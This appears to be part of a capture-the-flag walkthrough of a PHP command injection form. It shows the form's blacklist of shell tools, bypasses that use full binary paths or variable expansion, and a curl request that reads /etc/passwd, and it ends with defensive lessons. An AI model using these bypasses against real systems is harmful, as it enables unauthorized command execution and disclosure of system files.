Exploitation

Command Injection — Blacklist Bypass

Directory brute-force reveals /secret/ — a POST-based command execution form. Reading the PHP source exposes the blacklist:

PHP — BLACKLIST 
$blacklist = array('nc','python','bash','php','perl','rm','cat',
                   'head','tail','python3','more','less','sh','ls');

The filter splits by spaces and checks each word. Bypass by using full binary paths:

BlockedBypass
ls/bin/ls or l$@s
cat/bin/cat
python3/usr/bin/python3
bash/bin/bash
BASH 
$ curl -X POST http://10.48.138.143/secret/     --data 'command=/bin/cat+/etc/passwd'
→ Returns /etc/passwd as www-data

Defense

Takeaways

Docker Group = Root
Docker group membership grants unrestricted host filesystem access. Never add unprivileged users to the docker group — use rootless Docker or Podman instead.
Blacklists Don’t Work
Command blacklists are trivially bypassed with full paths, variable expansion, or encoding tricks. Use allowlists or avoid shell execution entirely.
Audit sudo Scripts
Scripts with user-controlled input executed via $msg are trivial command injection vectors. Never execute unsanitized variables.
No Creds in Source Files
Hardcoded MySQL root passwords and base64 “encrypted” secrets are not security. Use environment variables and proper secret management.
